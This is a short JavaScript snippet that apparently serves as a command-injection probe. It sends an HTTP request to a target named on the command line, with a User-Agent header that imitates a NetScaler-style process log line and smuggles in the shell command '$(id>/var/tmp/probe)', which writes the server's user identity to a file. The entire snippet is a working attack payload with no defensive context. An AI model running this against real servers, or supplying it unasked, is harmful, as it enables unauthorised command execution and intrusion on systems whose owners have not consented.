const target = process.argv[2];
const payload = "pitboss PPE unexpectedly died NSPPE-01;:$(id>/var/tmp/probe);# X";
fetch(target, {headers: {"User-Agent": payload}});
